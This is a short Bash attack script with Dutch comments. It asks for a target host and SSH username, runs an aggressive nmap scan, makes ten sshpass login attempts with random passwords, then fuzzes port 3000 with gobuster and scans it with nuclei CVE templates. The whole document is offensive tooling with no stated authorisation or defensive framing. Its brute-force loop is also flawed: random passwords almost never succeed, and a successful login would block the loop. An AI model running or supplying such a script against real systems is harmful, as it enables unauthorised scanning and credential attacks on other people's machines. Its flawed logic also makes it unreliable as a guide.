#!/bin/bash

# Definieer het doel-IP-adres of de URL
read -p "Voer het doel-IP-adres of de URL in: " doelwit

# Definieer de SSH-gebruikersnaam
read -p "Voer de SSH-gebruikersnaam in: " gebruikersnaam

# Voer een agressieve NMAP-scan uit
echo "Uitvoeren van een agressieve NMAP-scan..."
nmap -A $doelwit

# Definieer het aantal inlogpogingen
login_pogingen=10

# Probeer meerdere keren in te loggen via SSH
for ((i=1; i<=$login_pogingen; i++))
do
    # Genereer een willekeurig wachtwoord
    wachtwoord=$(openssl rand -base64 12)

    echo "Poging $i om in te loggen via SSH..."
    sshpass -p $wachtwoord ssh $gebruikersnaam@$doelwit

    # Controleer of het inloggen is gelukt
    if [ $? -eq 0 ]; then
        echo "Inloggen geslaagd!"
        break
    else
        echo "Inloggen mislukt."
    fi
done

# Voer gobuster fuzz uit
echo "Uitvoeren van gobuster fuzz..."
gobuster fuzz -u "http://$doelwit:3000/FUZZ" -w top10

# Voer nuclei uit
echo "Uitvoeren van nuclei..."
nuclei -u http://$doelwit:3000 -no-interactsh -t cves/